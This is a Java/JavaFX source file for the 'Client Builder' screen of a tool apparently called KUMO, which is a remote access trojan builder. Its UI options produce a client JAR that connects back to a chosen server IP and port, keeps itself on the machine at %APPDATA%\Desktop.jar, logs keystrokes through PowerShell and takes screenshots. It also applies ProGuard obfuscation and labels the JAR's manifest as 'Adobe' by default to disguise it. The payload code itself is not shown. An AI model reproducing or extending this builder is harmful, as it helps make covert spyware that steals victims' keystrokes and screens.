package GUI.Views;


import GUI.Components.TopBar;
import GUI.Styler;
import KUMO.ClientBuilder;
import Logger.Level;
import Logger.Logger;
import Server.Data.PseudoBase;
import Server.KumoSettings;
import com.jfoenix.controls.*;
import com.jfoenix.validation.RequiredFieldValidator;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.geometry.Insets;
import javafx.scene.Group;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.control.TitledPane;
import javafx.scene.control.Tooltip;
import javafx.scene.input.MouseButton;
import javafx.scene.layout.*;
import javafx.scene.paint.Paint;

import java.io.IOException;

public class ClientBuilderView {

    private JFXCheckBox persistent;
    private JFXCheckBox autoSpread;
    private JFXCheckBox debug;
    private JFXTextField jarCreatedBy;
    private JFXTextField jarVersion;
    private JFXTextField persistencePath;
    private JFXCheckBox createProguardRules;
    private JFXCheckBox keylog;
    private TextField updateTime;
    private JFXComboBox<String> screenshotTypeComboBox;

    public BorderPane getClientBuilderView() {
        BorderPane borderPane = new BorderPane();
        borderPane.getStylesheets().add(getClass().getResource(Styler.getCurrentStylesheet()).toExternalForm());
        borderPane.setTop(new TopBar().getTopBar(KUMO.Kumo.getPrimaryStage()));
        borderPane.setLeft(clientBuilderSettingsLeft());
        borderPane.setRight(jarSettingsRight());
        borderPane.setCenter(clientBuilderSettingsCenter());
        //borderPane.setBottom(new BottomBar().getBottomBar());
        return borderPane;
    }

    private HBox jarSettingsRight(){
        HBox hbox = Styler.hContainer(20);
        hbox.getStylesheets().add(getClass().getResource(Styler.getCurrentStylesheet()).toExternalForm());
        HBox.setHgrow(hbox, Priority.ALWAYS);
        hbox.setId("clientBuilder");
        hbox.setPadding(new Insets(75, 20, 20, 20));
        // Created-By
        Label createdByLabel = (Label) Styler.styleAdd(new Label("Implementation-Title: "), "label-bright");
        jarCreatedBy = new JFXTextField();

        // Version
        Label jarVersionLabel = (Label) Styler.styleAdd(new Label("Implementation-Version: "), "label-bright");
        jarVersion = new JFXTextField();

        // Persistence stuff
        Label persistenceSeparator = (Label) Styler.styleAdd(new Label("\nPersistence:"), "label-bright");
        persistencePath = new JFXTextField();
        Label persistencePathLabel = (Label) Styler.styleAdd(new Label("  Persistence Path:"), "label-bright");
        persistencePath.setTooltip(new Tooltip("If the path is not found on the remote machine, persistence will not be created!\nDefaults to %APPDATA%\\Desktop.jar"));

        // Proguard rules
        Label proguardLabel = (Label) Styler.styleAdd(new Label("Generate proguard rules: "), "label-bright");
        createProguardRules = new JFXCheckBox();

        TitledPane jarSettings = (TitledPane) Styler.styleAdd(new TitledPane(), "label-bright");
        GridPane grid = new GridPane();
        grid.setId("java-settings");
        grid.setVgap(4);
        grid.setPadding(new Insets(5, 5, 5, 5));

        // Add elements to grid
        grid.add(createdByLabel, 0,0);
        grid.add(jarCreatedBy, 1, 0);
        grid.add(jarVersionLabel, 0, 1);
        grid.add(jarVersion, 1, 1);
        grid.add(persistenceSeparator, 0, 2);
        grid.add(persistencePathLabel, 0, 3);
        grid.add(persistencePath, 1, 3);
        grid.add(proguardLabel, 0, 4);
        grid.add(createProguardRules, 1, 4);

        jarSettings.setLayoutY(10);
        jarSettings.setText("JAR Settings");
        jarSettings.setExpanded(false);
        jarSettings.setAnimated(true);
        jarSettings.setContent(grid);

        // Evasion, custom networking
        Label updateTimeLabel = (Label) Styler.styleAdd(new Label("Reconnect Time (ms): "), "label-bright");
        updateTimeLabel.setTooltip(new Tooltip("The amount of time to wait to reconnect when the client gets disconnected."));
        updateTime = new JFXTextField("1000");
        updateTime.textProperty().addListener(((observable, oldValue, newValue) -> {
            if (!newValue.matches("\\d*")) {
                updateTime.setText(newValue.replaceAll("[^\\d]", ""));
            }
        }));


        TitledPane networkSettings = (TitledPane) Styler.styleAdd(new TitledPane(), "label-bright");
        GridPane netGrid = new GridPane();
        netGrid.setId("java-settings");
        netGrid.setVgap(4);
        netGrid.setPadding(new Insets(5));
        netGrid.add(updateTimeLabel, 0, 0);
        netGrid.add(updateTime, 1, 0);

        networkSettings.setLayoutY(10);
        networkSettings.setText("Networking Settings");
        networkSettings.setExpanded(false);
        networkSettings.setAnimated(true);
        networkSettings.setContent(netGrid);


        // Handle both being opened at the same time (they shouldn't)
        jarSettings.setOnMouseClicked(event -> {
            if (event.getButton().equals(MouseButton.PRIMARY)){
                networkSettings.setExpanded(false);
            }
        });

        networkSettings.setOnMouseClicked(event -> {
            if (event.getButton().equals(MouseButton.PRIMARY)){
                jarSettings.setExpanded(false);
            }
        });

        hbox.getChildren().add(Styler.vContainer(40, jarSettings, networkSettings));//, networkSettings));

        return hbox;
    }

    private HBox clientBuilderSettingsLeft() {
        HBox hBox = Styler.hContainer(20);
        hBox.getStylesheets().add(getClass().getResource(Styler.getCurrentStylesheet()).toExternalForm());
        hBox.setId("clientBuilder");
        hBox.setPadding(new Insets(20, 20, 20, 20));
        VBox vbox = Styler.vContainer(5);
        vbox.getStylesheets().add(getClass().getResource(Styler.getCurrentStylesheet()).toExternalForm());

        Label title = (Label) Styler.styleAdd(new Label("Client Builder"), "title");
        persistent = new JFXCheckBox("Persistent");
        persistent.setDisableVisualFocus(true);
        persistent.setTooltip(new Tooltip("Windows & Linux only"));

        debug = new JFXCheckBox("Debug Mode");
        keylog = new JFXCheckBox("Keylog");
        keylog.setTooltip(new Tooltip("Windows only (PSH based)"));

        // Screenshot ext option
        Label scLabel = (Label) Styler.styleAdd(new Label("Screenshot type"), "label-bright");
        ObservableList<String> extensions = FXCollections.observableArrayList("jpg", "png");
        screenshotTypeComboBox = new JFXComboBox<>(extensions);
        screenshotTypeComboBox.setFocusColor(Paint.valueOf(Styler.getCurrentAccentColor()));
        screenshotTypeComboBox.getSelectionModel().select(KumoSettings.MscreenshotType);
        screenshotTypeComboBox.setOnAction((e) -> KumoSettings.MscreenshotType = screenshotTypeComboBox.getSelectionModel().getSelectedItem());

        Group group = new Group(Styler.hContainer(scLabel, screenshotTypeComboBox));


        hBox.getChildren().addAll(Styler.vContainer(20, title, persistent, debug, keylog, group)); //autoSpread, debug));


        return hBox;
    }

    private HBox clientBuilderSettingsCenter() {
        HBox hBox = Styler.hContainer(20);
        hBox.getStylesheets().add(getClass().getResource(Styler.getCurrentStylesheet()).toExternalForm());
        hBox.setId("clientBuilder");
        hBox.setPadding(new Insets(20, 20, 20, 20));

        RequiredFieldValidator fieldValidator = new RequiredFieldValidator("This field is required");
        Label title = (Label) Styler.styleAdd(new Label(" "), "title");

        Label serverIPLabel = (Label) Styler.styleAdd(new Label("Server IP: "), "label-bright");
        JFXTextField serverIP = new JFXTextField("" + KumoSettings.CONNECTION_IP);
        serverIP.setTooltip(new Tooltip("The IP/domain of the connect-back server"));
        serverIP.requestFocus();
        HBox serverIPBox = Styler.hContainer(serverIPLabel, serverIP);
        serverIPBox.setPadding(new Insets(10, 10, 10, 5));
        serverIP.setEditable(true);

        Label portLabel = (Label) Styler.styleAdd(new Label("Port: "), "label-bright");
        JFXTextField port = new JFXTextField("" + KumoSettings.PORT);
        port.setTooltip(new Tooltip("The port to connect back on"));
        HBox portBox = Styler.hContainer(portLabel, port);
        portBox.setPadding(new Insets(10, 10, 10, 5));
        port.setEditable(true);
        port.textProperty().addListener(((observable, oldValue, newValue) -> {
            if (!newValue.matches("\\d*")) {
                port.setText(newValue.replaceAll("[^\\d]", ""));
            }
        }));

        Label clientNameLabel = (Label) Styler.styleAdd(new Label("Name: "), "label-bright");
        JFXTextField clientName = new JFXTextField("Client");
        clientName.setTooltip(new Tooltip("The name of the client JAR file (without .jar)"));
        HBox clientNameBox = Styler.hContainer(clientNameLabel, clientName);
        clientNameBox.setPadding(new Insets(10, 0, 10, 0));
        clientName.setEditable(true);

        // Add required field to all fields
        JFXTextField[] fields = new JFXTextField[] {serverIP, port, clientName};
        for (JFXTextField f : fields){
            f.getValidators().add(fieldValidator);
            f.focusedProperty().addListener((o, old, newVal) -> {
                if (!newVal) f.validate();
            });
        }

        JFXButton buildClient = new JFXButton("Build");
        buildClient.setPrefWidth(150);
        buildClient.setPrefHeight(50);
        buildClient.setOnAction(event -> {
            if ((!serverIP.getText().equals("")) && !serverIP.getText().equals(KumoSettings.CONNECTION_IP)) {
                KumoSettings.CONNECTION_IP = (serverIP.getText());
            }
            if ((!port.getText().equals("")) && Integer.parseInt(port.getText()) != KumoSettings.PORT) {
                KumoSettings.PORT = (Integer.parseInt(port.getText()));
            }
            try {
                if (persistent.isSelected()) {
                    ClientBuilder.isPersistent = true;
                }
                if (debug.isSelected()){
                    ClientBuilder.isDebug = true;
                }
                if (keylog.isSelected()){
                    ClientBuilder.keylogger = true;
                }
                PseudoBase.writeKumoData();
            } catch (IOException e) {
                Logger.log(Level.ERROR, e.toString(), e);
            }
            if ((!clientName.getText().equals(""))) {
                ClientBuilder clientBuilder = new ClientBuilder(clientName.getText());
                try {
                    clientBuilder.run();
                } catch (IOException e) {
                    Logger.log(Level.ERROR, e.toString(), e);
                }
            }
            if ((!jarCreatedBy.getText().trim().equals(""))){
                ClientBuilder.jarCreatedBy = jarCreatedBy.getText();
            } else {
                ClientBuilder.jarCreatedBy = "Adobe";
            }
            if ((!jarVersion.getText().equals(""))){
                ClientBuilder.jarVersion = jarVersion.getText();
            }
            if (!persistencePath.getText().equals("")){
                ClientBuilder.persistencePath = persistencePath.getText();
            }
            if (createProguardRules.isSelected()){
                ClientBuilder.createProguard = true;
            }

            // Networking settings
            if (!updateTime.getText().equals("")){
                ClientBuilder.updateTime = Integer.parseInt(updateTime.getText());
            }
            JFXSnackbar snackbar = new JFXSnackbar(hBox);
            snackbar.enqueue(new JFXSnackbar.SnackbarEvent(new Label("Client JAR built")));
        });


        hBox.getChildren().add(Styler.vContainer(20, title, serverIPBox, portBox, clientNameBox, buildClient));
        HBox.setHgrow(hBox, Priority.ALWAYS);
        return hBox;
    }
}
